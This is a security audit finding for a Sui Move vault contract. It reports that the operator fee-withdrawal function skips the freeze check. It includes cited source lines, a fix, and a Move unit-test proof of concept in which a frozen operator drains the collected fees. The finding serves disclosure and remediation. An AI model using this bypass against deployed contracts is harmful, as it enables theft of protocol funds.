# Audit Report

## Title
Frozen Operator Can Bypass Freeze Mechanism to Extract Protocol Fee Revenue

## Summary

The `retrieve_deposit_withdraw_fee_operator()` function in the vault management module allows frozen operators to withdraw accumulated deposit and withdraw fees, completely bypassing the operator freeze security control. While all other operator functions properly check freeze status via `assert_operator_not_freezed()`, this function omits the check by lacking the required `Operation` parameter, enabling a frozen operator to drain protocol revenue.

## Finding Description

The vulnerable function is `retrieve_deposit_withdraw_fee_operator()` which accepts only an `OperatorCap` reference but critically does NOT include the `Operation` parameter needed to verify freeze status. [1](#0-0) 

The operator freeze mechanism is stored in the `Operation` shared object within a `freezed_operators: Table<address, bool>` field. [2](#0-1) 

The freeze check function `assert_operator_not_freezed()` requires both the `Operation` object (to access the freeze table) and the `OperatorCap` (to get the operator ID) to function properly. [3](#0-2) 

In stark contrast, ALL other operator functions properly implement the freeze check:
- `start_op_with_bag` includes the check [4](#0-3) 
- `end_op_with_bag` includes the check [5](#0-4) 
- `end_op_value_update_with_bag` includes the check [6](#0-5) 
- `execute_deposit` includes the check [7](#0-6) 
- `execute_withdraw` includes the check [8](#0-7) 
- `cancel_user_deposit` includes the check [9](#0-8) 

The underlying vault function only checks version and vault status but never verifies operator freeze status, directly extracting from the `deposit_withdraw_fee_collected` balance. [10](#0-9) 

The `deposit_withdraw_fee_collected` balance accumulates protocol revenue from both deposit operations [11](#0-10)  and withdraw operations. [12](#0-11) 

## Impact Explanation

**Direct Fund Loss**: A frozen operator can drain all accumulated deposit and withdraw fees from the vault's `deposit_withdraw_fee_collected` balance, resulting in direct theft of protocol revenue that would otherwise be used for operations, rewards, or protocol development.

**Security Integrity Breach**: The operator freeze mechanism is designed as a critical emergency stop feature. When an admin freezes an operator due to suspected compromise or malicious behavior, that operator should be completely blocked from all vault operations. The test suite confirms this design intent - frozen operators should abort with `ERR_OPERATOR_FREEZED` error. [13](#0-12)  The ability to continue extracting fees undermines this fundamental security control, making the freeze mechanism ineffective at its core purpose.

## Likelihood Explanation

**Highly Likely**: The function is public and directly callable by anyone holding an `OperatorCap`, including frozen operators. The only precondition is that the operator has been frozenâ€”which is precisely when the vulnerability becomes exploitable and when a malicious actor has the strongest incentive to extract any remaining value before complete revocation.

The execution is trivially simple: a frozen operator calls `retrieve_deposit_withdraw_fee_operator()` with their `OperatorCap` to extract fees. No complex transaction sequences, timing windows, or special conditions are required. The frozen operator retains their `OperatorCap` object even after being frozen, making the attack immediately executable.

## Recommendation

Add the `Operation` parameter to the function signature and call `vault::assert_operator_not_freezed()` at the beginning of the function, consistent with all other operator functions:

```move
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    operation: &Operation,  // ADD THIS PARAMETER
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault::assert_operator_not_freezed(operation, cap);  // ADD THIS CHECK
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

## Proof of Concept

```move
#[test]
// [TEST-CASE: Frozen operator can bypass freeze to extract fees - VULNERABILITY]
public fun test_frozen_operator_can_extract_fees_vulnerability() {
    let mut s = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(s.ctx());

    // Initialize vault
    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
    init_vault::init_create_reward_manager<SUI_TEST_COIN>(&mut s);

    // Setup oracle
    s.next_tx(OWNER);
    {
        let mut oracle_config = s.take_shared<OracleConfig>();
        test_helpers::set_aggregators(&mut s, &mut clock, &mut oracle_config);
        let prices = vector[1 * ORACLE_DECIMALS];
        test_helpers::set_prices(&mut s, &mut clock, &mut oracle_config, prices);
        test_scenario::return_shared(oracle_config);
    };

    // Create deposit to accumulate fees
    s.next_tx(OWNER);
    {
        let coin = coin::mint_for_testing<SUI_TEST_COIN>(10_000_000_000, s.ctx());
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let mut reward_manager = s.take_shared<RewardManager<SUI_TEST_COIN>>();
        
        let (coin, receipt) = user_entry::request_deposit(
            &mut vault,
            &mut reward_manager,
            coin,
            option::none(),
            &clock,
            s.ctx(),
        );
        transfer::public_transfer(coin, OWNER);
        transfer::public_transfer(receipt, OWNER);
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(reward_manager);
    };

    // Execute deposit to collect fees
    s.next_tx(OWNER);
    {
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let config = s.take_shared<OracleConfig>();
        
        vault::update_free_principal_value(&mut vault, &config, &clock);
        vault.execute_deposit(&clock, &config, 0, 10_000_000_000);
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(config);
    };

    // Verify fees collected (should be 0.1% = 10_000_000)
    s.next_tx(OWNER);
    {
        let vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        assert!(vault.deposit_withdraw_fee_collected() == 10_000_000);
        test_scenario::return_shared(vault);
    };

    // FREEZE THE OPERATOR
    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let mut operation = s.take_shared<Operation>();
        let operator_cap = s.take_from_sender<OperatorCap>();
        
        vault_manage::set_operator_freezed(
            &admin_cap,
            &mut operation,
            operator_cap.operator_id(),
            true,
        );
        
        // Verify operator is frozen
        assert!(vault::operator_freezed(&operation, operator_cap.operator_id()));
        
        test_scenario::return_shared(operation);
        s.return_to_sender(admin_cap);
        s.return_to_sender(operator_cap);
    };

    // VULNERABILITY: Frozen operator can still extract fees!
    s.next_tx(OWNER);
    {
        let operator_cap = s.take_from_sender<OperatorCap>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        
        // This should FAIL but it SUCCEEDS - frozen operator extracts fees
        let fee_retrieved = vault_manage::retrieve_deposit_withdraw_fee_operator(
            &operator_cap,
            &mut vault,
            10_000_000,
        );
        
        // Frozen operator successfully stole all protocol fees!
        assert!(fee_retrieved.value() == 10_000_000);
        
        test_scenario::return_shared(vault);
        s.return_to_sender(operator_cap);
        fee_retrieved.destroy_for_testing();
    };

    // Verify fees were drained by frozen operator
    s.next_tx(OWNER);
    {
        let vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        assert!(vault.deposit_withdraw_fee_collected() == 0);
        test_scenario::return_shared(vault);
    };

    clock.destroy_for_testing();
    s.end();
}
```

## Notes

This vulnerability represents a critical gap in the operator freeze security mechanism. The freeze feature is explicitly designed to immediately halt all operator actions when compromise or malicious behavior is suspected. The existence of test case `test_start_op_fail_op_freezed` confirms that frozen operators should be completely blocked. However, this single oversight in the fee retrieval function creates an escape hatch that allows frozen operators to extract accumulated protocol revenue, defeating the entire purpose of the emergency freeze mechanism.

### Citations

**File:** volo-vault/sources/manage.move (L150-156)
```text
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    _: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

**File:** volo-vault/sources/volo_vault.move (L89-92)
```text
public struct Operation has key, store {
    id: UID,
    freezed_operators: Table<address, bool>,
}
```

**File:** volo-vault/sources/volo_vault.move (L380-385)
```text
public(package) fun assert_operator_not_freezed(operation: &Operation, cap: &OperatorCap) {
    let cap_id = cap.operator_id();
    // If the operator has ever been freezed, it will be in the freezed_operator map, check its value
    // If the operator has never been freezed, no error will be emitted
    assert!(!operator_freezed(operation, cap_id), ERR_OPERATOR_FREEZED);
}
```

**File:** volo-vault/sources/volo_vault.move (L835-836)
```text
    let deposit_fee_balance = coin_balance.split(deposit_fee as u64);
    self.deposit_withdraw_fee_collected.join(deposit_fee_balance);
```

**File:** volo-vault/sources/volo_vault.move (L1041-1042)
```text
    let fee_balance = withdraw_balance.split(fee_amount as u64);
    self.deposit_withdraw_fee_collected.join(fee_balance);
```

**File:** volo-vault/sources/volo_vault.move (L1544-1557)
```text
public(package) fun retrieve_deposit_withdraw_fee<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    self.check_version();
    self.assert_normal();

    emit(DepositWithdrawFeeRetrieved {
        vault_id: self.vault_id(),
        amount: amount,
    });

    self.deposit_withdraw_fee_collected.split(amount)
}
```

**File:** volo-vault/sources/operation.move (L105-105)
```text
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/operation.move (L218-218)
```text
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/operation.move (L306-306)
```text
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/operation.move (L391-391)
```text
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/operation.move (L444-444)
```text
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/operation.move (L460-460)
```text
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/tests/operation/operation.test.move (L1562-1563)
```text
#[expected_failure(abort_code = vault::ERR_OPERATOR_FREEZED, location = vault)]
// [TEST-CASE: Should do op fail if operator is freezed.] @test-case OPERATION-012
```
